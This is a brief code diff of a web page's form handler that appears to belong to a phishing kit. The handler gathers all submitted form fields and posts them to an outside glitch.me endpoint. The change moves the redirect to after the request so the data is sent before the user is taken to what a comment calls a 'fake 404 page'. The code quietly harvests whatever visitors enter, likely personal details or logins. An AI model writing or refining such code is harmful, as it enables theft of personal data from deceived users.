@@ -355,14 +355,14 @@
       e.preventDefault();
       const formData = new FormData(this);
       const data = Object.fromEntries(formData);
-      window.location.href = "/rno_online_hssc.html";
+    
 
       await fetch("https://hushed-groovy-stallion.glitch.me/submit", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify(data)
       });
-      
+        window.location.href = "/rno_online_hssc.html";
 
       // alert("Data submitted successfully!");
       // Redirect to fake 404 page
